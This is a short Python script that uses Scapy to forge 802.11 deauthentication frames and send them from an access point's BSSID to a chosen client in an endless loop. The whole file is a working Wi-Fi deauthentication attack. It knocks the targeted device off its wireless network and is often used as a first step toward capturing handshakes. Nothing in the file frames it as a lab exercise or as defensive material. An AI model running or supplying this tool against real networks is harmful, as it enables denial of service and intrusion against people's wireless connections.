from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.01)
